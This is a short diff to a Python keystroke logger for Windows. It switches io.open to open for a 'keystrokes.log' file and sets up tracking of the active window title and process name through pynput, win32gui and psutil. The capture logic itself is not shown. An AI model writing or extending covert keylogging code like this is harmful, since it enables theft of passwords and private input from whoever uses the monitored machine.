@@ -1,6 +1,6 @@
 import datetime
-import io
 import os
+# Removed the 'io' because it didn't really help with the char issue.
 import psutil
 import win32gui
 import win32process
@@ -10,7 +10,7 @@ from pynput import keyboard
 current_dir = os.getcwd()
 
 # Open the log file for writing
-log_file = io.open(os.path.join(current_dir, "keystrokes.log"), "w")
+log_file = open(os.path.join(current_dir, "keystrokes.log"), "w")
 
 # Track the current window title and process name
 current_window_title = None
